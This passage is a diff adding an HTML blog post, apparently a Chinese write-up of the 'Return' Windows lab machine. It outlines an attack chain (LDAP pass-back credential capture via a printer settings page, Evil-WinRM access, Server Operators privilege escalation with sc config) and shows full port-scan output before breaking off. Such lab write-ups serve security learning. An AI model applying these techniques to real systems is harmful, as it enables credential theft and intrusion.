@@ -1,0 +1,760 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="少年だった僕たちは曾经都是少年的我们いつか青年に変わっていく终有一天会变为青年。年老いていつか枯れ葉のように年老之后会如枯叶一般誰にも知られず朽ちていく在不为人知的情况下腐朽。  靶机ip：10.129.217.15 难度：低 涉及内容： 信息收集：端口探测 (RustScan&#x2F;Nmap) 与 Web 目录爆破 (Feroxbuster) 。 凭据获取：利用打印机后台 settings.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从零开始的windows生活-Return">
+<meta property="og:url" content="http://example.com/2026/01/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-Return/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="少年だった僕たちは曾经都是少年的我们いつか青年に変わっていく终有一天会变为青年。年老いていつか枯れ葉のように年老之后会如枯叶一般誰にも知られず朽ちていく在不为人知的情况下腐朽。  靶机ip：10.129.217.15 难度：低 涉及内容： 信息收集：端口探测 (RustScan&#x2F;Nmap) 与 Web 目录爆破 (Feroxbuster) 。 凭据获取：利用打印机后台 settings.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/01/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-Return/vmware_U62IGeLPCP.png">
+<meta property="article:published_time" content="2026-01-15T02:00:10.000Z">
+<meta property="article:modified_time" content="2026-01-15T03:31:39.630Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/01/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-Return/vmware_U62IGeLPCP.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>从零开始的windows生活-Return - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"busuanzi":{"enable":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="从零开始的windows生活-Return"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-15 10:00" pubdate>
+          January 15, 2026 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          31 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">从零开始的windows生活-Return</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>少年だった僕たちは<br>曾经都是少年的我们<br>いつか青年に変わっていく<br>终有一天会变为青年。<br>年老いていつか枯れ葉のように<br>年老之后会如枯叶一般<br>誰にも知られず朽ちていく<br>在不为人知的情况下腐朽。</p>
+<hr>
+<p>靶机ip：10.129.217.15</p>
+<p>难度：低</p>
+<p>涉及内容：</p>
+<p><strong>信息收集</strong>：端口探测 (RustScan&#x2F;Nmap) 与 Web 目录爆破 (Feroxbuster) 。</p>
+<p><strong>凭据获取</strong>：利用打印机后台 <code>settings.php</code> 漏洞进行 LDAP Pass-back 攻击，捕获明文账号密码 。</p>
+<p><strong>初始访问</strong>：使用 Evil-WinRM 登录 <code>svc-printer</code> 账户 。</p>
+<p><strong>权限提升</strong>：滥用 <code>Server Operators</code> 组权限，通过修改系统服务 (<code>sc config</code>) 提权至 SYSTEM 。</p>
+<hr>
+<h3 id="1-边界侦察与服务指纹识别-Reconnaissance"><a href="#1-边界侦察与服务指纹识别-Reconnaissance" class="headerlink" title="1. 边界侦察与服务指纹识别 (Reconnaissance)"></a>1. 边界侦察与服务指纹识别 (Reconnaissance)</h3><p>rustscan全端口扫描：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kaada)-[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop]<br>└─<span class="hljs-comment"># ./rustscan -a 10.129.217.15 -r 1-65535 --ulimit 5000</span><br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  <span class="hljs-symbol">/</span>  ___&#125; <span class="hljs-symbol">/</span> &#123;&#125; \ |  `| |<br>| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;<span class="hljs-symbol">/</span>  <span class="hljs-operator">/</span>\  \| |\  |<br>`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;<br>The Modern Day Port Scanner.<br><span class="hljs-params">________________________________________</span><br><span class="hljs-params">:</span> http:<span class="hljs-symbol">//discord.skerritt.blog</span>         :<br>: https:<span class="hljs-symbol">//github.com/RustScan/RustScan</span> :<br> <span class="hljs-operator">-</span>-------------------------------------<br>Scanning ports faster than you can say &#x27;SYN ACK&#x27;<br><br>[~] The config file is expected to be at <span class="hljs-string">&quot;/root/.rustscan.toml&quot;</span><br>[~] Automatically increasing ulimit value to <span class="hljs-number">5000</span>.<br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">53</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">80</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">88</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">135</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">139</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">389</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">445</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">464</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">593</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">636</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">3268</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">3269</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">47001</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">49666</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">49668</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">49664</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">49665</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">49676</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">49679</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">49671</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">49675</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">49674</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">49694</span><br>Open <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>:<span class="hljs-number">63229</span><br>[~] Starting Script(s)<br>[~] Starting Nmap <span class="hljs-number">7.95</span> ( https:<span class="hljs-symbol">//nmap.org</span> ) at <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>1-<span class="hljs-number">14</span> <span class="hljs-number">21</span>:<span class="hljs-number">13</span> EST<br>Initiating Ping Scan at <span class="hljs-number">21</span>:<span class="hljs-number">13</span><br>Scanning <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span> [<span class="hljs-number">4</span> ports]<br>Completed Ping Scan at <span class="hljs-number">21</span>:<span class="hljs-number">13</span>, <span class="hljs-number">0.11</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br>Initiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">21</span>:<span class="hljs-number">13</span><br>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">21</span>:<span class="hljs-number">13</span>, <span class="hljs-number">0.00</span>s elapsed<br>DNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.00</span>s. <span class="hljs-params">Mode:</span> Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><br>Initiating SYN Stealth Scan at <span class="hljs-number">21</span>:<span class="hljs-number">13</span><br>Scanning <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span> [<span class="hljs-number">24</span> ports]<br>Discovered open port <span class="hljs-number">80</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">445</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">139</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">53</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">636</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">135</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">49664</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">464</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">3269</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">49666</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">47001</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">49676</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">389</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">63229</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">49668</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">49694</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">49675</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">88</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">593</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">49674</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">49665</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">49679</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">49671</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Discovered open port <span class="hljs-number">3268</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Completed SYN Stealth Scan at <span class="hljs-number">21</span>:<span class="hljs-number">13</span>, <span class="hljs-number">0.19</span>s elapsed (<span class="hljs-number">24</span> total ports)<br>Nmap scan report for <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br>Host is up, received echo-reply ttl <span class="hljs-number">127</span> (<span class="hljs-number">0.091</span>s latency).<br>Scanned at <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>1-<span class="hljs-number">14</span> <span class="hljs-number">21</span>:<span class="hljs-number">13</span>:<span class="hljs-number">52</span> EST for <span class="hljs-number">0</span>s<br><br>PORT      STATE SERVICE          REASON<br><span class="hljs-number">53</span><span class="hljs-symbol">/tcp</span>    open  domain           syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">80</span><span class="hljs-symbol">/tcp</span>    open  http             syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">88</span><span class="hljs-symbol">/tcp</span>    open  kerberos-sec     syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">135</span><span class="hljs-symbol">/tcp</span>   open  msrpc            syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">139</span><span class="hljs-symbol">/tcp</span>   open  netbios-ssn      syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">389</span><span class="hljs-symbol">/tcp</span>   open  ldap             syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">445</span><span class="hljs-symbol">/tcp</span>   open  microsoft-ds     syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">464</span><span class="hljs-symbol">/tcp</span>   open  kpasswd5         syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">593</span><span class="hljs-symbol">/tcp</span>   open  http-rpc-epmap   syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">636</span><span class="hljs-symbol">/tcp</span>   open  ldapssl          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">3268</span><span class="hljs-symbol">/tcp</span>  open  globalcatLDAP    syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">3269</span><span class="hljs-symbol">/tcp</span>  open  globalcatLDAPssl syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">47001</span><span class="hljs-symbol">/tcp</span> open  winrm            syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49664</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49665</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49666</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49668</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49671</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49674</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49675</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49676</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49679</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">49694</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><span class="hljs-number">63229</span><span class="hljs-symbol">/tcp</span> open  unknown          syn-ack ttl <span class="hljs-number">127</span><br><br>Read data files <span class="hljs-params">from:</span> <span class="hljs-symbol">/usr/share/nmap</span><br>Nmap <span class="hljs-params">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.39</span> seconds<br>           Raw packets <span class="hljs-params">sent:</span> <span class="hljs-number">28</span> (<span class="hljs-number">1.208</span>KB) | <span class="hljs-params">Rcvd:</span> <span class="hljs-number">25</span> (<span class="hljs-number">1.084</span>KB)<br><br></code></pre></td></tr></table></figure>
+
+<p>rustscan——nmap细节探测</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span 